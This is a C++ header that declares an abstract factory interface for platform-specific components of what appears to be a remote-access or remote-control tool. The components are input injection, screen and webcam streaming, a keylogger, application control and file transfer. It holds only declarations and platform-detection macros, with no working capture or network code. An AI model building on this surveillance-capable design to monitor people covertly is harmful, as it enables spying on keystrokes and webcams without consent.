#pragma once
#include <memory>
#include <string>
#include "interfaces/IInputInjector.hpp"
#include "interfaces/IVideoStreamer.hpp"
#include "interfaces/IKeylogger.hpp"
#include "interfaces/IAppManager.hpp"
#include "interfaces/IFileTransfer.hpp"

namespace interfaces {

// ============================================================================
// IPlatformFactory - Abstract Factory for platform-specific components
// ============================================================================
// This interface defines the contract for creating all platform-specific
// components. Each platform (Windows, Linux, macOS) provides its own
// implementation of this factory.
//
// Benefits:
// - Single Responsibility: Each factory owns one platform
// - Open/Closed: Add new platforms without modifying existing code
// - Dependency Inversion: Core depends on abstraction, not concrete types
//
// Usage:
//   auto factory = PlatformRegistry::instance().get_current_platform();
//   auto streamer = factory->create_screen_streamer();
//   auto keylogger = factory->create_keylogger();
// ============================================================================

class IPlatformFactory {
public:
    virtual ~IPlatformFactory() = default;

    // ========== Component Factory Methods ==========

    // Create input injector for mouse/keyboard simulation
    // May return nullptr if not supported on this platform
    virtual std::unique_ptr<IInputInjector> create_input_injector() = 0;

    // Create screen capture/streamer
    virtual std::unique_ptr<IVideoStreamer> create_screen_streamer() = 0;

    // Create webcam capture/streamer
    // May return nullptr if no webcam is available
    virtual std::unique_ptr<IVideoStreamer> create_webcam_streamer() = 0;

    // Create keylogger
    virtual std::unique_ptr<IKeylogger> create_keylogger() = 0;

    // Create application manager (list/launch/kill apps)
    virtual std::unique_ptr<IAppManager> create_app_manager() = 0;

    // Create file transfer handler
    virtual std::unique_ptr<IFileTransfer> create_file_transfer() = 0;

    // ========== Platform Info ==========

    // Platform name for logging/debugging (e.g., "Windows", "Linux-X11")
    virtual const char* platform_name() const noexcept = 0;

    // Check if this platform is currently the running platform
    virtual bool is_current_platform() const noexcept = 0;

    // Check if all essential components are available
    // May return false if required dependencies are missing
    virtual bool is_fully_supported() const noexcept { return true; }

    // ========== Optional: Lazy Initialization ==========

    // Initialize platform-specific resources (called once before first use)
    // Default implementation does nothing
    virtual void initialize() {}

    // Cleanup platform-specific resources
    virtual void shutdown() {}
};

// ============================================================================
// Helper: Platform Detection Macros
// ============================================================================

#if defined(_WIN32) || defined(_WIN64)
    #define PLATFORM_IS_WINDOWS 1
    #define PLATFORM_IS_LINUX 0
    #define PLATFORM_IS_MACOS 0
#elif defined(__linux__)
    #define PLATFORM_IS_WINDOWS 0
    #define PLATFORM_IS_LINUX 1
    #define PLATFORM_IS_MACOS 0
#elif defined(__APPLE__)
    #define PLATFORM_IS_WINDOWS 0
    #define PLATFORM_IS_LINUX 0
    #define PLATFORM_IS_MACOS 1
#else
    #define PLATFORM_IS_WINDOWS 0
    #define PLATFORM_IS_LINUX 0
    #define PLATFORM_IS_MACOS 0
#endif

} // namespace interfaces
